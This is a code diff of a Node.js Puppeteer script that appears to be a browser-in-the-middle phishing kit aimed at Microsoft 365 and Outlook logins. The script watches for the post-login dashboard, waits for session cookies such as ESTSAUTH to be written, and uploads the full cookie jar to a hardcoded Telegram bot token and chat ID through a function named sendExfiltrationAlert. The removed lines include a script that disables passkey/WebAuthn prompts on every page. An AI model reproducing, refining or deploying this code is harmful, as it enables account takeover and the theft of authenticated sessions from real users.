@@ -8,16 +8,12 @@ puppeteer.use(StealthPlugin());
 const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
 const CHAT_ID = '1318100118';
 
-/**
- * Sends cookies via HTML-safe formatting to avoid Telegram 400 errors.
- */
 async function sendExfiltrationAlert(cookies, finalUrl) {
     const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
     const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     try {
-        // HTML mode is safer for long URLs with special chars
-        const textAlert = `<b>✅ SUCCESS: Session Captured</b>\n\n<code>${finalUrl}</code>\n\n<b>Final Cookie Count:</b> ${cookies.length}\n<i>Status: Full Auth Jar Uploaded.</i>`;
+        const textAlert = `<b>✅ FINAL AUTH SUCCESS</b>\n\n<code>${new URL(finalUrl).hostname}</code>\n\n<b>Cookies:</b> ${cookies.length}\n<i>Status: User fully logged in.</i>`;
         
         await axios.post(msgUrl, {
             chat_id: CHAT_ID,
@@ -28,57 +24,30 @@ async function sendExfiltrationAlert(cookies, finalUrl) {
         const cookieData = JSON.stringify(cookies, null, 2);
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        
-        let host = "Unknown";
-        try { host = new URL(finalUrl).hostname; } catch(e) {}
-        
-        form.append('caption', `Finalized Session: ${host}`);
+        form.append('caption', `Full Authenticated Jar: ${new URL(finalUrl).hostname}`);
         form.append('document', Buffer.from(cookieData, 'utf-8'), {
-            filename: `cookies_${Date.now()}.json`,
+            filename: `FINAL_cookies_${Date.now()}.json`,
             contentType: 'application/json'
         });
 
         await axios.post(docUrl, form, { headers: form.getHeaders() });
-        console.log("[TELEGRAM] Finalized session file sent.");
-
     } catch (e) {
-        console.error('[EXFIL-FATAL]', e.response?.data || e.message);
+        console.error('[TELEGRAM-ERR]', e.message);
     }
 }
 
 async function startSession(io, socket) {
     let browser;
-    let hasExfiltrated = false; // Prevents duplicate triggers for the same user
+    let hasExfiltrated = false;
 
     try {
         browser = await puppeteer.launch({
             headless: "new",
-            args: [
-                '--no-sandbox', 
-                '--disable-setuid-sandbox', 
-                '--disable-dev-shm-usage',
-                '--disable-web-security'
-            ]
+            args: ['--no-sandbox', '--disable-setuid-sandbox']
         });
 
         const page = await browser.newPage();
-
-        // Standard 2026 Passkey/WebAuthn bypass
-        await page.evaluateOnNewDocument(() => {
-            delete window.PublicKeyCredential;
-            if (navigator.credentials) {
-                const originalGet = navigator.credentials.get;
-                navigator.credentials.get = function(opt) {
-                    if (opt && opt.publicKey) {
-                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
-                    }
-                    return originalGet.call(this, opt);
-                };
-            }
-        });
-
-        await page.setViewport({ width: 1280, height: 720 });
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36');
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
 
         const emitFrame = async () => {
             if (socket.connected) {
@@ -93,18 +62,29 @@ async function startSession(io, socket) {
         const heartbeat = setInterval(emitFrame, 1500);
 
         page.on('framenavigated', async (frame) => {
-            const url = frame.url();
+            const url = frame.url().toLowerCase();
             
             if (!hasExfiltrated) {
-                const successKeys = ['office.com', 'microsoft365.com', 'shell/homepage', 'outlook.live', 'myapps.microsoft'];
-                
-                if (successKeys.some(key => url.toLowerCase().includes(key))) {
-                    hasExfiltrated = true; // Engage lock immediately
+                /**
+                 * STRICT DETECTION: 
+                 * We look for the "Post-Login" shell or inbox, 
+                 * NOT the authorize/redirect URLs that appear during the login flow.
+                 */
+                const isDashboard = url.includes('www.office.com/?auth=') || 
+                                    url.includes('outlook.live.com/mail') || 
+                                    url.includes('microsoft365.com/?') ||
+                                    (url.includes('office.com') && url.includes('shell/homepage'));
+
+                // We also ensure it's NOT a redirect/authorize URL
+                const isAuthStep = url.includes('authorize') || url.includes('relyingparty');
+
+                if (isDashboard && !isAuthStep) {
+                    hasExfiltrated = true; // Engage lock
                     
-                    console.log(`[TRIGGER] Success detected. Waiting for cookies to settle...`);
+                    console.log(`[AUTH-DETECTED] Finalizing capture for: ${url}`);
                     
-                    // Essential 3-second delay to catch the final ESTSAUTH/RPSSecAuth cookies
-                    await new Promise(r => setTimeout(r, 3500));
+                    // Wait for the final session tokens (ESTSAUTH, etc.) to be written
+                    await new Promise(r => setTimeout(r, 5000));
                     
                     const cookies = await page.cookies();
                     await sendExfiltrationAlert(cookies, url);
@@ -126,7 +106,6 @@ async function startSession(io, socket) {
         });
 
     } catch (error) {
-        console.error('[ORCH-ERR]', error.message);
         if (browser) await browser.close();
     }
 }
